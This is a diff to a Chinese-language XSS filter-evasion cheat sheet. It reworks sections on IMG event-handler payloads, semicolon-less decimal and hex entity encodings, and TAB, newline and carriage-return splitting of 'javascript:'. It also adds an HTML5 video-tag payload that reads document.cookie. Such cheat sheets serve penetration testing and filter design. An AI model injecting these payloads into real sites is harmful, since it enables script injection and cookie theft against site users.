@@ -290,50 +290,54 @@ alert(String.fromCharCode(88,83,83))//--
  如果没有任何形式的引号被允许，你可以eval()一串fromCharCode在javascript中来创建任何你需要的xss向量。
 
 `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`
-### 默认SRC属性去绕过SRC域名检测过滤器
+### 巧用src属性去绕过SRC域名检测过滤器
 
-这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于任何一个HTML标签，例如Form、Iframe、Input、Embed等等。它也允许任何该标签的相关事件去替换，例如onblur, onclick等，后面我们会附加一个可用的事件列表。由David Cross提供，Abdullah Hussam编辑。
-
+使用onXX事件绕过src检查：
 `<IMG SRC=# onmouseover="alert('xxs')">`
-### 默认SRC属性通过省略它的值
 
+通过省略它的值绕过检查：
 `<IMG SRC= onmouseover="alert('xxs')">`
-### 默认SRC属性
 
-通过完全不设置它
+通过完全不设置它绕过检查：
 `<IMG onmouseover="alert('xxs')">`
-### 通过error事件触发alert##
 
+
+通过error事件触发alert：
 `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`
+
 ### 十进制html编码引用
 使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS Calculator 获取更多信息。
 
 `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`
-### 结尾没有分号的十进制html编码引用
+#### 结尾没有分号的十进制html编码引用
 它是经常有用的在绕过寻找”&#XX;”格式的xss过滤，因为大多数人不知道最多允许7位字符的编码限制。这也是有用的对那些对字符串解码像`$tmp_string =~ s/.&#(\d+);./$1/;` 的过滤器,它们错误的认为一个html编码必须要用;去结束。
 
 `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`
-### 结尾没有分号的十六进制html编码引用
+#### 结尾没有分号的十六进制html编码引用
 这也是一种实用的xss攻击针对上文的`$tmp_string =~ s/.&#(\d+);./$1/; `，错误的认为数字编码跟随在#后面（十六进制htnl编码并非如此）。使用 XSS Calculator 获取更多信息。
 
 `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`
-### 内嵌TAB
-用来分开代码
 
-`<IMG SRC="jav	ascript:alert('XSS');">`
-### 内嵌被编码的TAB
-用来分开xss攻击代码
+### 使用TAB、换行、回车符改变代码形式
 
-`<IMG SRC="jav&#x09;ascript:alert('XSS');">`
+使用普通tab分开代码：`<IMG SRC="jav	ascript:alert('XSS');">`
+使用编码的TAB分开xss攻击代码：`<IMG SRC="jav&#x09;ascript:alert('XSS');">`
 
-### 内嵌换行符
+- TAB 编码： `&#x09;`
+- 换行符 编码：`&#x0A;`
+- 回车符编码：`&#x0D;`
+
+
+#### 推广至换行符，回车符
 一些网站声称09-13编码的所有字符（十进制）都可以实现这种形式的攻击。这是不正确的。只有09(tab), 10 (换行) 和 13 (回车)可以使用。你可以查看ascii表为更详细的信息。
 
 `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`
-### 编码回车符分开xss代码
-注意：上面我编写的三个xss字符串比必须长度的字符串更长，原因是0可以被省略。通常我看到的过滤器假设十六进制和十进制的编码是两到三个字符，正确的应该是一到七个字符。
 
 `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`
+
+注意：上面我编写的三个xss字符串比必须长度的字符串更长，原因是0可以被省略。通常我看到的过滤器假设十六进制和十进制的编码是两到三个字符，正确的应该是一到七个字符。
+
+
 ### 没有分割的javascript指令
 
 null字符也可以作为一个xss向量，但不同于上面。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器通过变动像这个例子中的。
@@ -623,6 +627,13 @@ PS: ueditor编辑器默认是可以上传xml文件的, 大家遇到可以试下.
 <input onmouseover='j&#97;v\u0061script:&#97;lert(7)'>
 <input onmouseover=loc\u0061tion='j&#97;v\u0061s'+'cript:&#97;le'+'rt(7)'>
 ```
+### HTML5新标签
+
+#### video 标签
+
+`<video src="http://someip/11.avi" onloadedmetadata="alert(document.cookie);" ondurationoncharged="alert(/xss2/);" ontimeupdate="alert(/xss3/);" tabindex="0"></video>`
+
+
 
 ## CMS通用XSS漏洞
 ### 帝国CMS
